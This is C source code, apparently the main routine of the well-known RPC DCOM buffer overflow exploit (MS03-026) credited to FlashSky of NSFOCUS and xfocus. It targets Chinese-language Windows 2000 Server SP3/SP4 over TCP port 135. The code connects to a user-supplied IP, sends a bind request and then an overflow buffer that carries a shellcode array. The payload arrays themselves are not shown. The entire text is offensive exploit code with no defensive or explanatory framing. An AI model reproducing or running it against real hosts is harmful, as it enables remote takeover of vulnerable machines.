void main(int argc,char ** argv)
{
    WSADATA WSAData;
    SOCKET sock;
    int len,len1;
    SOCKADDR_IN addr_in;
    short port=135;
    unsigned char buf1[0x1000];
    unsigned char buf2[0x1000];

    printf("RPC DCOM overflow Vulnerability discoveried by NSFOCUS\n");
    printf("Code by FlashSky,Flashsky xfocus org\n");
    printf("Welcome to our Site: http://www.xfocus.org\n");
    printf("Welcome to our Site: http://www.venustech.com.cn\n");
    if(argc!=2)
    {
        printf("%s targetIP \n",argv[0]);
        printf("for cn w2k server sp3/sp4+ms03-26\n");
    }
    
    if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0)
    {
        printf("WSAStartup error.Error:%d\n",WSAGetLastError());
        return;
    }

    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(port);
    addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);
    
    if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
    {
        printf("Socket failed.Error:%d\n",WSAGetLastError());
        return;
    }
    len1=sizeof(request1);
    len=sizeof(sccnsp3sp4);

    if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)
    {
        printf("Connect failed.Error:%d",WSAGetLastError());
        return;
    }
    memcpy(buf2,request1,sizeof(request1));
    *(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sccnsp3sp4)/2;  
    *(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sccnsp3sp4)/2;
    memcpy(buf2+len1,request2,sizeof(request2));
    len1=len1+sizeof(request2);
    memcpy(buf2+len1,sccnsp3sp4,sizeof(sccnsp3sp4));
    len1=len1+sizeof(sccnsp3sp4);
    memcpy(buf2+len1,request3,sizeof(request3));
    len1=len1+sizeof(request3);
    memcpy(buf2+len1,request4,sizeof(request4));
    len1=len1+sizeof(request4);
    *(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+len-0xc;

    *(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+len-0xc;  
    *(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+len-0xc;
    *(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+len-0xc;
    *(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+len-0xc;
    *(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+len-0xc;
    *(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+len-0xc;
    *(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+len-0xc;
    if (send(sock,bindstr,sizeof(bindstr),0)==SOCKET_ERROR)
    {
            printf("Send failed.Error:%d\n",WSAGetLastError());
            return;
    }
    
    len=recv(sock,buf1,1000,NULL);
    if (send(sock,buf2,len1,0)==SOCKET_ERROR)
    {
            printf("Send failed.Error:%d\n",WSAGetLastError());
            return;
    }
//    len=recv(sock,buf1,1024,NULL);
}